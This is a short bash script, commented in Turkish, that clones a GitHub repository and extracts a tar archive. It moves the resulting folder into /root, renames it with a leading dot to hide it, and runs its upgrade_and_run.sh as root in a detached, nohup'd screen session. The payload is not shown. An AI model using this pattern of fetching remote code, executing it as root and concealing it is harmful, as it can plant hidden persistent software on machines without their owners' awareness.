#!/bin/bash

# 1. GitHub deposunu klonla ve klonlanan dizine gir
git clone https://github.com/dogaatac/dogibokubuseferyemedi
cd dogibokubuseferyemedi

# 2. Tar dosyasını çıkar
tar -xf x12.tar

# 3. Çıkartılan klasörü root altına taşı ve gizli hale getir
sudo mv hayirlisi /root/
sudo chmod 700 /root/hayirlisi        # İzinleri sadece root erişimine ayarla
sudo chown root:root /root/hayirlisi  # Klasörün sahibi root olsun
sudo mv /root/hayirlisi /root/.hayirlisi  # Klasörü gizli hale getir (. ekleyerek)

# 4. upgrade_and_run.sh script'ini 'caliskan' isimli screen oturumunda çalıştır
sudo screen -dmS caliskan bash -c "cd /root/.hayirlisi && nohup bash upgrade_and_run.sh 2>&1 &"

# 5. GitHub deposunun dizinine geri dön
cd ~/dogibokubuseferyemedi

# 6. 'online' isimli yeni bir screen oturumu başlat
sudo screen -S online
